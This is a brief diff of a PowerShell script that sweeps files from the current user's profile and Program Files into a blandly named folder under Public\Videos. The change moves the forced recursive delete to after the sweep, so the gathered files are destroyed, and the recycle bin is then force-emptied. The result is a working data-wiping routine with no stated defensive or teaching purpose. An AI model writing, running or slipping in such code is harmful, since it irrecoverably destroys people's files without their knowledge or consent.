@@ -1,9 +1,6 @@
 # Define source and destination paths
 $destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
 
-# Remove the destination directory and its contents
-Remove-Item -Path $destinationPath -Recurse -Force
-
 # Define source paths
 $sourcePaths = @("C:\Users\$($env:USERNAME)", "C:\Program Files")
 
@@ -50,6 +47,6 @@ function SearchAndMoveFile {
 foreach ($sourcePath in $sourcePaths) {
     SearchAndMoveFile -directory $sourcePath
 }
-
+Remove-Item -Path $destinationPath -Recurse -Force
 # Empty the recycle bin
 Clear-RecycleBin -Force
